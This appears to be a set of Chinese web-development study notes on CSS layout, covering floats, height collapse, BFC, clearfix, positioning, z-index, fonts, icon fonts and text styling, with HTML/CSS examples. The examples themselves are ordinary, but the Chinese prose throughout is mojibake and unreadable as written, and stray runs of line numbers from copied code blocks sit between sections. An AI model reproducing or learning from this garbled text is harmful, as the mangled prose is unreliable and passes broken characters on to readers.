é»è®¤ä¸ä¼ä»ç¶åç´ ä¸­ç§»åº\n\n4ãæµ®å¨åç´ åå·¦æåå³ç§»å¨æ¶ï¼ä¸ä¼è¶è¿å®åè¾¹çå¶ä»æµ®å¨åç´ \n\n5ãå¦ææµ®å¨åç´ çä¸è¾¹æ¯ä¸ä¸ªæ²¡ææµ®å¨çååç´ ï¼åæµ®å¨åç´ æ æ³ä¸ç§»\n\n6ãæµ®å¨åç´ ä¸ä¼è¶è¿å®ä¸è¾¹çæµ®å¨çåå¼åç´ ï¼æå¤æå¤å°±æ¯åå®ä¸æ ·é«\n\n7ãæµ®å¨åç´ ä¸ä¼çä½æå­ï¼æå­ä¼èªå¨ç¯ç»å¨æµ®å¨åç´ çå¨å´ï¼æä»¥æä»¬å¯ä»¥å©ç¨æµ®å¨æ¥è®¾ç½®æå­ç¯ç»å¾ççææ\n\nç®åæ»ç»ï¼\n\næµ®å¨ç®åæ¥è®²å®çä¸»è¦ä½ç¨å°±æ¯è®©é¡µé¢ä¸­çåç´ å¯ä»¥æ°´å¹³æåï¼éè¿æµ®å¨å¯ä»¥å¶ä½ä¸äºæ°´å¹³æ¹åçå¸å±ãåç´ è®¾ç½®æµ®å¨ä»¥åï¼å°ä¼ä»ææ¡£æµä¸­è±ç¦»ï¼ä»ææ¡£æµä¸­è±ç¦»åï¼åç´ çä¸äºç¹ç¹ä¹ä¼åçååã\n\nè±ç¦»ææ¡£æµçç¹ç¹ï¼\n\nååç´ ï¼\n\n1ãååç´ ä¸å¨ç¬å é¡µé¢çä¸è¡\n\n2ãè±ç¦»ææ¡£æµä»¥åï¼ååç´ çå®½åº¦åé«åº¦é»è®¤é½è¢«åå®¹æå¼\n\nè¡ååç´ ï¼\n\n1ãè¡ååç´ è±ç¦»ææ¡£æµä»¥åä¼åæååç´ ï¼ç¹ç¹åååç´ ä¸æ ·\n\nè±ç¦»ææ¡£æµä»¥åï¼ä¸éè¦ååºåååè¡åäº\n\n# ç½é¡µçåºç¡å¸å±\n\n<!doctype html>\n<html lang="en">\n  <head>\n    <meta charset="utf-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="x-ua-compatible" content="ie=edge">\n    <title>document</title>\n    <style>\n\n      header, main, footer{\n        width: 1000px;\n        margin: 0 auto;\n      }\n\n      /* è®¾ç½®å¤´é¨ */\n      header{\n        height: 150px;\n        background-color: silver;\n      }\n\n      /* è®¾ç½®ä¸»ä½ */\n      main{\n        height: 500px;\n        background-color: #bfa;\n        margin: 10px auto;\n      }\n\n      nav, article, aside{\n        float: left;\n        height: 100%;\n      }\n\n      /* è®¾ç½®å·¦ä¾§çå¯¼èª */\n      nav{\n        width: 200px;\n        background-color: yellow;\n      }\n\n      /* è®¾ç½®ä¸­é´çåå®¹ */\n      article{\n        width: 580px;\n        background-color: orange;\n        margin: 0 10px;\n      }\n\n      /* è®¾ç½®å³ä¾§çåå®¹ */\n      aside{\n        width: 200px;\n        background-color: pink;\n      }\n\n      /* è®¾ç½®åºé¨ */\n      footer{\n        height: 150px;\n        background-color: tomato;\n      }\n    </style>\n  </head>\n  <body>\n\n    \x3c!-- åå»ºå¤´é¨ --\x3e\n    <header></header>\n\n    \x3c!-- åå»ºç½é¡µçä¸»ä½ --\x3e\n    <main>\n      \x3c!-- å·¦ä¾§å¯¼èª --\x3e\n      <nav></nav>\n\n      \x3c!-- ä¸­é´çåå®¹ --\x3e\n      <article></article>\n\n      \x3c!-- å³è¾¹çè¾¹æ  --\x3e\n      <aside></aside>\n\n    </main>\n\n    \x3c!-- ç½é¡µçåºé¨ --\x3e\n    <footer></footer>\n  </body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n\n\n# é«åº¦å¡é·é®é¢\n\nå¨æµ®å¨å¸å±ä¸­ï¼ç¶åç´ çé«åº¦é»è®¤æ¯è¢«å­åç´ æå¼çï¼å½å­åç´ æµ®å¨åï¼å¶ä¼å®å¨è±ç¦»ææ¡£æµï¼å­åç´ ä»ææ¡£æµä¸­è±ç¦»ï¼å°ä¼æ æ³æèµ·ç¶åç´ çé«åº¦ï¼å¯¼è´ç¶åç´ çé«åº¦ä¸¢å¤±ãç¶åç´ é«åº¦ä¸¢å¤±ä»¥åï¼å¶ä¸çåç´ ä¼èªå¨ä¸ç§»ï¼å¯¼è´é¡µé¢çå¸å±æ··ä¹±ãæä»¥é«åº¦å¡é·æ¯æµ®å¨å¸å±ä¸­æ¯è¾å¸¸è§çä¸ä¸ªé®é¢ï¼è¿ä¸ªé®é¢æä»¬å¿é¡»è¦è¿è¡å¤çï¼\n\nbfc(block formatting context) åçº§æ ¼å¼åç¯å¢ï¼bfcæ¯ä¸ä¸ªcssä¸­çä¸ä¸ªéå«çå±æ§ï¼å¯ä»¥ä¸ºä¸ä¸ªåç´ å¼å¯bfcãå¼å¯bfcè¯¥åç´ ä¼åæä¸ä¸ªç¬ç«çå¸å±åºå\n\nåç´ å¼å¯bfcåçç¹ç¹ï¼\n\n 1. å¼å¯bfcçåç´ ä¸ä¼è¢«æµ®å¨åç´ æè¦ç\n 2. å¼å¯bfcçåç´ å­åç´ åç¶åç´ å¤è¾¹è·ä¸ä¼éå \n 3. å¼å¯bfcçåç´ å¯ä»¥åå«æµ®å¨çå­åç´ \n\nå¯ä»¥éè¿ä¸äºç¹æ®æ¹å¼æ¥å¼å¯åç´ çbfcï¼\n\n 1. è®¾ç½®åç´ çæµ®å¨ï¼ä¸æ¨èï¼\n 2. å°åç´ è®¾ç½®ä¸ºè¡åååç´ ï¼ä¸æ¨èï¼\n 3. å°åç´ çoverflowè®¾ç½®ä¸ºä¸ä¸ªévisibleçå¼\n\nå¸¸ç¨çæ¹å¼ï¼ä¸ºåç´ è®¾ç½® overflow:hidden å¼å¯å¶bfc ä»¥ä½¿å¶å¯ä»¥åå«æµ®å¨åç´ ã\n\n<!doctype html>\n<html lang="en">\n  <head>\n    <meta charset="utf-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="x-ua-compatible" content="ie=edge">\n    <title>document</title>\n    <style>\n      .outer{\n        border: 10px red solid;\n        overflow: hidden;\n      }\n\n      .inner{\n        width: 100px;\n        height: 100px;\n        background-color: #bfa;\n        float: left;\n      }\n    </style>\n  </head>\n  <body>\n\n    <div class="outer">\n\n      <div class="inner"></div>\n\n    </div>\n\n    <div style="width: 200px;height: 200px;background-color:yellow;"></div>\n\n  </body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n# clearæ¸é¤æµ®å¨å½±å\n\nç±äºbox1çæµ®å¨ï¼å¯¼è´box3ä½ç½®ä¸ç§»ãä¹å°±æ¯box3æ¶å°äºbox1æµ®å¨çå½±åï¼ä½ç½®åçäºæ¹åã\n\nå¦ææä»¬ä¸å¸ææä¸ªåç´ å ä¸ºå¶ä»åç´ æµ®å¨çå½±åèæ¹åä½ç½®ï¼å¯ä»¥éè¿clearå±æ§æ¥æ¸é¤æµ®å¨åç´ å¯¹å½ååç´ æäº§ççå½±å\n\nä½ç¨ï¼æ¸é¤æµ®å¨åç´ å¯¹å½ååç´ æäº§ççå½±å\n\nå¯éå¼ï¼\n\n * left æ¸é¤å·¦ä¾§æµ®å¨åç´ å¯¹å½ååç´ çå½±å\n\n * right æ¸é¤å³ä¾§æµ®å¨åç´ å¯¹å½ååç´ çå½±å\n\n * both æ¸é¤ä¸¤ä¾§ä¸­æå¤§å½±åçé£ä¾§\n\nåçï¼è®¾ç½®æ¸é¤æµ®å¨ä»¥åï¼æµè§å¨ä¼èªå¨ä¸ºåç´ æ·»å ä¸ä¸ªä¸å¤è¾¹è·ï¼ä»¥ä½¿å¶ä½ç½®ä¸åå¶ä»åç´ çå½±å\n\n<!doctype html>\n<html lang="en">\n  <head>\n    <meta charset="utf-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="x-ua-compatible" content="ie=edge">\n    <title>document</title>\n    <style>\n\n      div{\n        font-size: 50px;\n      }\n\n      .box1{\n        width: 200px;\n        height: 200px;\n        background-color: #bfa;\n        float: left;\n      }\n\n      .box2{\n        width: 400px;\n        height: 150px;\n        background-color: #ff0;\n        float: right;\n      }\n\n      .box3{\n        width: 200px;\n        height: 200px;\n        background-color: orange;\n        clear: both;\n      }\n    </style>\n  </head>\n  <body>\n\n    <div class="box1">1</div>\n    <div class="box2">2</div>\n    <div class="box3">3</div> \n\n  </body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n# é«åº¦å¡é·é®é¢çè§£å³æ¹æ¡\n\n<!doctype html>\n<html lang="en">\n  <head>\n    <meta charset="utf-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="x-ua-compatible" content="ie=edge">\n    <title>document</title>\n    <style>\n      .box1{\n        border: 10px red solid;\n\n        /* overflow: hidden; */\n      }\n\n      .box2{\n        width: 100px;\n        height: 100px;\n        background-color: #bfa;\n        float: left;\n      }\n\n      .box3{\n        clear: both;\n      }\n\n      .box1::after{\n        content: \'\';\n        display: block;\n        clear: both;\n      }\n\n    </style>\n  </head>\n  <body>\n\n    <div class="box1">\n      <div class="box2"></div>\n      \x3c!-- <div class="box3"></div> --\x3e\n    </div>\n\n  </body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n# clearfix\n\nclearfix è¿ä¸ªæ ·å¼å¯ä»¥åæ¶è§£å³é«åº¦å¡é·åå¤è¾¹è·éå çé®é¢ï¼å½ä½ å¨éå°è¿äºé®é¢æ¶ï¼ç´æ¥ä½¿ç¨clearfixè¿ä¸ªç±»å³å¯ ã\n\n<!doctype html>\n<html lang="en">\n  <head>\n    <meta charset="utf-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="x-ua-compatible" content="ie=edge">\n    <title>document</title>\n    <style>\n      .box1{\n        width: 200px;\n        height: 200px;\n        background-color: #bfa;\n      }\n\n      /* .box1::before{\n      content: \'\';\n      display: table;\n      } */\n\n      .box2{\n        width: 100px;\n        height: 100px;\n        background-color: orange;\n        margin-top: 100px;\n      }\n\n      /* clearfix è¿ä¸ªæ ·å¼å¯ä»¥åæ¶è§£å³é«åº¦å¡é·åå¤è¾¹è·éå çé®é¢ï¼å½ä½ å¨éå°è¿äºé®é¢æ¶ï¼ç´æ¥ä½¿ç¨clearfixè¿ä¸ªç±»å³å¯ */\n      .clearfix::before,\n      .clearfix::after{\n        content: \'\';\n        display: table;\n        clear: both;\n      }\n    </style>\n  </head>\n  <body>\n\n    <div class="box1 clearfix">\n      <div class="box2"></div>\n    </div>\n\n  </body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n\n# å®ä½\n\n# å®ä½ç®ä»\n\nå®ä½ï¼positionï¼\n\nå®ä½æ¯ä¸ç§æ´å é«çº§çå¸å±ææ®µï¼éè¿å®ä½å¯ä»¥å°åç´ ææ¾å°é¡µé¢çä»»æä½ç½®ãä½¿ç¨positionå±æ§æ¥è®¾ç½®å®ä½ã\n\n * static é»è®¤å¼ï¼åç´ æ¯éæ­¢çæ²¡æå¼å¯å®ä½\n * relative å¼å¯åç´ çç¸å¯¹å®ä½\n * absolute å¼å¯åç´ çç»å¯¹å®ä½\n * fixed å¼å¯åç´ çåºå®å®ä½\n * sticky å¼å¯åç´ çç²æ»å®ä½\n\nç¸å¯¹å®ä½ï¼\n\nå½åç´ çpositionå±æ§å¼è®¾ç½®ä¸ºrelativeæ¶åå¼å¯äºåç´ çç¸å¯¹å®ä½ã\n\nç¸å¯¹å®ä½çç¹ç¹ï¼\n\n 1. åç´ å¼å¯ç¸å¯¹å®ä½ä»¥åï¼å¦æä¸è®¾ç½®åç§»éåç´ ä¸ä¼åçä»»ä½çåå\n 2. ç¸å¯¹å®ä½æ¯åç§äºåç´ å¨ææ¡£æµä¸­çä½ç½®è¿è¡å®ä½ç\n 3. ç¸å¯¹å®ä½ä¼æååç´ çå±çº§\n 4. ç¸å¯¹å®ä½ä¸ä¼ä½¿åç´ è±ç¦»ææ¡£æµ\n 5. ç¸å¯¹å®ä½ä¸ä¼æ¹ååç´ çæ§è´¨åè¿æ¯åï¼è¡åè¿æ¯è¡å\n\nåç§»éï¼offsetï¼\n\nå½åç´ å¼å¯äºå®ä½ä»¥åï¼å¯ä»¥éè¿åç§»éæ¥è®¾ç½®åç´ çä½ç½®\n\ntop\n\n * å®ä½åç´ åå®ä½ä½ç½®ä¸è¾¹çè·ç¦»\n\nbottom\n\n * å®ä½åç´ åå®ä½ä½ç½®ä¸è¾¹çè·ç¦»ï¼å®ä½åç´ åç´æ¹åçä½ç½®ç±topåbottomä¸¤ä¸ªå±æ§æ¥æ§å¶ãéå¸¸æåµä¸æä»¬åªä¼ä½¿ç¨å¶ä¸­ä¸\n * topå¼è¶å¤§ï¼å®ä½åç´ è¶åä¸ç§»å¨\n * bottomå¼è¶å¤§ï¼å®ä½åç´ è¶åä¸ç§»å¨\n\nleft\n\n * å®ä½åç´ åå®ä½ä½ç½®çå·¦ä¾§è·ç¦»\n\nright\n\n * å®ä½åç´ åå®ä½ä½ç½®çå³ä¾§è·ç¦»\n * å®ä½åç´ æ°´å¹³æ¹åçä½ç½®ç±leftårightä¸¤ä¸ªå±æ§æ§å¶ãéå¸¸æåµä¸åªä¼ä½¿ç¨ä¸ä¸ª\n * leftè¶å¤§åç´ è¶é å³\n * rightè¶å¤§åç´ è¶é å·¦\n\n# ç»å¯¹å®ä½\n\nç»å¯¹å®ä½\n- å½åç´ çpositionå±æ§å¼è®¾ç½®ä¸ºabsoluteæ¶ï¼åå¼å¯äºåç´ çç»å¯¹å®ä½\n- ç»å¯¹å®ä½çç¹ç¹ï¼\n1.å¼å¯ç»å¯¹å®ä½åï¼å¦æä¸è®¾ç½®åç§»éåç´ çä½ç½®ä¸ä¼åçåå\n2.å¼å¯ç»å¯¹å®ä½åï¼åç´ ä¼ä»ææ¡£æµä¸­è±ç¦»\n3.ç»å¯¹å®ä½ä¼æ¹ååç´ çæ§è´¨ï¼è¡ååæåï¼åçå®½é«è¢«åå®¹æå¼\n4.ç»å¯¹å®ä½ä¼ä½¿åç´ æåä¸ä¸ªå±çº§\n5.ç»å¯¹å®ä½åç´ æ¯ç¸å¯¹äºå¶åå«åè¿è¡å®ä½ç\n\nåå«å( containing block )\n- æ­£å¸¸æåµä¸ï¼\nåå«åå°±æ¯ç¦»å½ååç´ æè¿çç¥åååç´ \n&lt;div> &lt;div>&lt;/div> &lt;/div>\n&lt;div>&lt;span>&lt;em>hello&lt;/em>&lt;/span>&lt;/div>\n\n- ç»å¯¹å®ä½çåå«å:\nåå«åå°±æ¯ç¦»å®æè¿çå¼å¯äºå®ä½çç¥ååç´ ï¼\nå¦æææçç¥ååç´ é½æ²¡æå¼å¯å®ä½åæ ¹åç´ å°±æ¯å®çåå«å\n- htmlï¼æ ¹åç´ ãåå§åå«åï¼\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n# åºå®å®ä½\n\nå°åç´ çpositionå±æ§è®¾ç½®ä¸ºfixedåå¼å¯äºåç´ çåºå®å®ä½ãåºå®å®ä½ä¹æ¯ä¸ç§ç»å¯¹å®ä½ï¼æä»¥åºå®å®ä½çå¤§é¨åç¹ç¹é½åç»å¯¹å®ä½ä¸æ ·ï¼å¯ä¸ä¸åçæ¯åºå®å®ä½æ°¸è¿åç§äºæµè§å¨çè§å£è¿è¡å®ä½ãåºå®å®ä½çåç´ ä¸ä¼éç½é¡µçæ»å¨æ¡æ»å¨ã\n\n# ç²æ»å®ä½\n\nå½åç´ çpositionå±æ§è®¾ç½®ä¸ºstickyæ¶åå¼å¯äºåç´ çç²æ»å®ä½ï¼ç²æ»å®ä½åç¸å¯¹å®ä½çç¹ç¹åºæ¬ä¸è´ï¼ä¸åçæ¯ç²æ»å®ä½å¯ä»¥å¨åç´ å°è¾¾æä¸ªä½ç½®æ¶å°å¶åºå®ã\n\n<!doctype html>\n<html lang="en">\n\n  <head>\n    <meta charset="utf-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="x-ua-compatible" content="ie=edge">\n    <title>å¯¼èªæ¡</title>\n    <link rel="stylesheet" href="./css/reset.css">\n    <style>\n\n      body{\n        height: 3000px;\n      }\n\n      /* è®¾ç½®navçå¤§å° */\n      .nav{\n\n        /* è®¾ç½®å®½åº¦åé«åº¦ */\n        width: 1210px;\n        height: 48px;\n        /* è®¾ç½®èæ¯é¢è² */\n        background-color: #e8e7e3;\n\n        margin:100px auto;\n\n        position: sticky;\n        top: 10px;\n\n      }\n\n      /* è®¾ç½®navä¸­li */\n      .nav li{\n        /* è®¾ç½®liåå·¦æµ®å¨ï¼å·²ä½¿èåæ¨ªåæå */\n        float: left;\n        /* è®¾ç½®liçé«åº¦ */\n        /* height: 48px; */\n        /* å°æå­å¨ç¶åç´ ä¸­åç´å±ä¸­ */\n        line-height: 48px;\n\n      }\n\n      /* è®¾ç½®açæ ·å¼ */\n      .nav a{\n        /* å°aè½¬æ¢ä¸ºååç´  */\n        display: block;\n        /* å»é¤ä¸åçº¿ */\n        text-decoration: none;\n        /* è®¾ç½®å­ä½é¢è² */\n        color: #777777;\n        /* ä¿®æ¹å­ä½å¤§å° */\n        font-size: 18px;\n\n        padding: 0 39px;\n      }\n\n      .nav li:last-child a{\n        padding: 0 42px 0 41px;\n      }\n\n      /* è®¾ç½®é¼ æ ç§»å¥çææ */\n      .nav a:hover{\n        background-color: #3f3f3f;\n        color: #e8e7e3;\n      }\n    </style>\n  </head>\n\n  <body>\n    \x3c!-- åå»ºå¯¼èªæ¡çç»æ --\x3e\n    <ul class="nav">\n      <li>\n        <a href="#">html/css</a>\n      </li>\n      <li>\n        <a href="#">browser side</a>\n      </li>\n      <li>\n        <a href="#">server side</a>\n      </li>\n      <li>\n        <a href="#">programming</a>\n      </li>\n      <li>\n        <a href="#">xml</a>\n      </li>\n      <li>\n        <a href="#">web building</a>\n      </li>\n      <li>\n        <a href="#">reference</a>\n      </li>\n    </ul>\n\n  </body>\n\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n\n\n# ç»å¯¹å®ä½ä¸çåç´ å¸å±\n\næ°´å¹³å¸å±\n\nleft + margin-left + border-left + padding-left + width + padding-right + border-right + margin-right + right = åå«åçåå®¹åºçå®½åº¦\n\nå½æä»¬å¼å¯äºç»å¯¹å®ä½åï¼æ°´å¹³æ¹åçå¸å±ç­å¼å°±éè¦æ·»å left å right ä¸¤ä¸ªå¼ãæ­¤æ¶è§ååä¹åä¸æ ·åªæ¯å¤æ·»å äºä¸¤ä¸ªå¼ãå½åçè¿åº¦çº¦æï¼å¦æ9ä¸ªå¼ä¸­æ²¡æ auto åèªå¨è°æ´rightå¼ä»¥ä½¿ç­å¼æ»¡è¶³ï¼å¦ææautoï¼åèªå¨è°æ´autoçå¼ä»¥ä½¿ç­å¼æ»¡è¶³ã\n\nå¯è®¾ç½®autoçå¼\n\n * margin\n * width\n * left\n * right\n\nå ä¸ºleft å rightçå¼é»è®¤æ¯autoï¼æä»¥å¦æä¸æå®leftårightãåç­å¼ä¸æ»¡è¶³æ¶ï¼ä¼èªå¨è°æ´è¿ä¸¤ä¸ªå¼ã\n\nåç´æ¹åå¸å±çç­å¼çä¹å¿é¡»è¦æ»¡è¶³ï¼\n\ntop + margin-top/bottom + padding-top/bottom + border-top/bottom + height = åå«åçé«åº¦\n\n# åç´ å±çº§\n\nå¯¹äºå¼å¯äºå®ä½åç´ ï¼å¯ä»¥éè¿z-indexå±æ§æ¥æå®åç´ çå±çº§ãz-indexéè¦ä¸ä¸ªæ´æ°ä½ä¸ºåæ°ï¼å¼è¶å¤§åç´ çå±çº§è¶é«ï¼åç´ çå±çº§è¶é«è¶ä¼åæ¾ç¤ºãå¦æåç´ çå±çº§ä¸æ ·ï¼åä¼åæ¾ç¤ºé ä¸çåç´ ãç¥åçåç´ çå±çº§åé«ä¹ä¸ä¼çä½åä»£åç´ ã\n\n\n# å­ä½åèæ¯\n\n# å­ä½\n\nå­ä½ç¸å³çæ ·å¼ï¼\n\n * color ç¨æ¥è®¾ç½®å­ä½é¢è²\n\n * font-size å­ä½çå¤§å°\n\nfont-sizeç¸å³çåä½\n\n * em ç¸å½äºå½ååç´ çä¸ä¸ªfont-size\n\n * rem ç¸å¯¹äºæ ¹åç´ çä¸ä¸ªfont-size\n\nfont-family å­ä½æï¼å­ä½çæ ¼å¼ï¼\n\n * serif è¡¬çº¿å­ä½\n\n * sans-serif éè¡¬çº¿å­ä½\n\n * monospace ç­å®½å­ä½\n\næå®å­ä½çç±»å«ï¼æµè§å¨ä¼èªå¨ä½¿ç¨è¯¥ç±»å«ä¸çå­ä½ï¼font-family å¯ä»¥åæ¶æå®å¤ä¸ªå­ä½ï¼å¤ä¸ªå­ä½é´ä½¿ç¨,éå¼\n\nå­ä½çææ¶ä¼åä½¿ç¨ç¬¬ä¸ä¸ªï¼ç¬¬ä¸ä¸ªæ æ³ä½¿ç¨åä½¿ç¨ç¬¬äºä¸ª ä»¥æ­¤ç±»æ¨ã\n\n# å¾æ å­ä½\n\nå¾æ å­ä½ï¼iconfontï¼\n\n * å¨ç½é¡µä¸­ç»å¸¸éè¦ä½¿ç¨ä¸äºå¾æ ï¼å¯ä»¥éè¿å¾çæ¥å¼å¥å¾æ ï¼ä½æ¯å¾çå¤§å°æ¬èº«æ¯è¾å¤§ï¼å¹¶ä¸éå¸¸çä¸çµæ´»\n * æä»¥å¨ä½¿ç¨å¾æ æ¶ï¼æä»¬è¿å¯ä»¥å°å¾æ ç´æ¥è®¾ç½®ä¸ºå­ä½ï¼ç¶åéè¿font-faceçå½¢å¼æ¥å¯¹å­ä½è¿è¡å¼å¥\n * è¿æ ·æä»¬å°±å¯ä»¥éè¿ä½¿ç¨å­ä½çå½¢å¼æ¥ä½¿ç¨å¾æ ã\n\nfontawesome ä½¿ç¨æ­¥éª¤\n\n 1. ä¸è½½ https://fontawesome.com/\n 2. è§£å\n 3. å°cssåwebfontsç§»å¨å°é¡¹ç®ä¸­\n 4. å°all.csså¼å¥å°ç½é¡µä¸­\n 5. ä½¿ç¨å¾æ å­ä½\n\nç´æ¥éè¿ç±»åæ¥ä½¿ç¨å¾æ å­ä½\n\nclass="fas fa-bell"\nclass="fab fa-accessible-icon"\n\n<i class="fas fa-bell" style="font-size:80px; color:red;"></i>\n<i class="fas fa-bell-slash"></i>\n<i class="fab fa-accessible-icon"></i>\n<i class="fas fa-otter" style="font-size: 160px; color:green;"></i>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\néè¿ä¼ªåç´ æ¥è®¾ç½®å¾æ å­ä½\n\n 1. æ¾å°è¦è®¾ç½®å¾æ çåç´ éè¿beforeæafteréä¸­\n\n 2. å¨contentä¸­è®¾ç½®å­ä½çç¼ç \n\n 3. è®¾ç½®å­ä½çæ ·å¼\n\ncontent: \'\\f1b0\';\n/* font-family: \'font awesome 5 brands\'; */\nfont-family: \'font awesome 5 free\';\nfont-weight: 900; \ncolor: blue;\nmargin-right: 10px;\n\n\n1\n2\n3\n4\n5\n6\n\n\né¿éå¾æ å­ä½åº\n\n<!doctype html>\n<html lang="en">\n  <head>\n    <meta charset="utf-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="x-ua-compatible" content="ie=edge">\n    <title>document</title>\n    <link rel="stylesheet" href="./iconfont/iconfont.css">\n    <style>\n      i.iconfont{\n        font-size: 100px;\n      }\n\n      p::before{\n        content: \'\\e625\';\n        font-family: \'iconfont\';\n        font-size: 100px;\n      }\n    </style>\n  </head>\n  <body>\n\n    <i class="iconfont">&#xe61c;</i>\n    <i class="iconfont">&#xe622;</i>\n    <i class="iconfont">&#xe623;</i>\n\n    <i class="iconfont icon-qitalaji"></i>\n\n    <p>hello</p>\n  </body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n# å­ä½è®¾ç½®\n\nè¡é«ï¼line heightï¼ï¼è¡é«æçæ¯æå­å æçå®éé«åº¦ãå¯ä»¥éè¿line-heightæ¥è®¾ç½®è¡é«ï¼è¡é«å¯ä»¥ç´æ¥æå®ä¸ä¸ªå¤§å°ï¼px emï¼ï¼ä¹å¯ä»¥ç´æ¥ä¸ºè¡é«è®¾ç½®ä¸ä¸ªæ´æ°ãå¦ææ¯ä¸ä¸ªæ´æ°çè¯ï¼è¡é«å°ä¼æ¯å­ä½çæå®çåæ°ãè¡é«ç»å¸¸è¿ç¨æ¥è®¾ç½®æå­çè¡é´è·ï¼è¡é´è· = è¡é« - å­ä½å¤§å°ã\n\nå­ä½æ¡ï¼å­ä½æ¡å°±æ¯å­ä½å­å¨çæ ¼å­ï¼è®¾ç½®font-sizeå®éä¸å°±æ¯å¨è®¾ç½®å­ä½æ¡çé«åº¦ï¼è¡é«ä¼å¨å­ä½æ¡çä¸ä¸å¹³ååéã\n\nå­ä½å¯ä»¥ä½¿ç¨ä¸é¢çç®åå±æ§ï¼\n\ndiv{\n  border: 1px red solid;\n  /* \n  font å¯ä»¥è®¾ç½®å­ä½ç¸å³çææå±æ§\n  è¯­æ³ï¼\n  font: å­ä½å¤§å°/è¡é« å­ä½æ\n  è¡é« å¯ä»¥çç¥ä¸å å¦æä¸åä½¿ç¨é»è®¤å¼\n  */\n\n  /* font-size: 50px;\n  font-family: \'times new roman\', times, serif; */\n  font-weight: bold;\n  /* font: 50px/2  å¾®è½¯éé», \'times new roman\', times, serif; */\n  /* font: normal normal 50px/2  å¾®è½¯éé», \'times new roman\', times, serif; */\n  font: bold italic 50px/2  å¾®è½¯éé», \'times new roman\', times, serif;\n  /* font:50px \'times new roman\', times, serif;\n  line-height: 2; */\n\n  /* font-size: 50px; */\n  /* font-weight å­é å­ä½çå ç² \n  å¯éå¼ï¼\n  normal é»è®¤å¼ ä¸å ç²\n  bold å ç²\n  100-900 ä¹ä¸ªçº§å«ï¼æ²¡ä»ä¹ç¨ï¼\n  font-style å­ä½çé£æ ¼\n  normal æ­£å¸¸ç\n  italic æä½\n  */\n  /* font-weight: bold; */\n  /* font-weight: 500;\n  font-style: italic; */\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n# ææ¬æ ·å¼\n\ntext-align ææ¬çæ°´å¹³å¯¹é½\n\n * left å·¦ä¾§å¯¹é½\n\n * right å³å¯¹é½\n\n * center å±ä¸­å¯¹é½\n\n * justify ä¸¤ç«¯å¯¹é½\n\nvertical-align è®¾ç½®åç´ åç´å¯¹é½çæ¹å¼\n\n * baseline é»è®¤å¼ åºçº¿å¯¹é½\n\n * top é¡¶é¨å¯¹é½\n\n * bottom åºé¨å¯¹é½\n\n * middle å±ä¸­å¯¹é½\n\ntext-decoration è®¾ç½®ææ¬ä¿®é¥°\n\n * none ä»ä¹é½æ²¡æ\n\n * underline ä¸åçº¿\n\n * line-through å é¤çº¿\n\n * overline ä¸åçº¿\n\nwhite-space è®¾ç½®ç½é¡µå¦ä½å¤çç©ºç½\n\n * normal æ­£å¸¸\n\n * nowrap ä¸æ¢è¡\n\n * pre ä¿çç©ºç½\n\n# èæ¯è®¾ç½®\n\nbackground-image è®¾ç½®èæ¯å¾ç\n\n * å¯ä»¥åæ¶è®¾ç½®èæ¯å¾çåèæ¯é¢è²ï¼è¿æ ·èæ¯é¢è²å°ä¼æä¸ºå¾ççèæ¯è²\n * å¦æèæ¯çå¾çå°äºåç´ ï¼åèæ¯å¾çä¼èªå¨å¨åç´ ä¸­å¹³éºå°åç´ éºæ»¡\n * å¦æèæ¯çå¾çå¤§äºåç´ 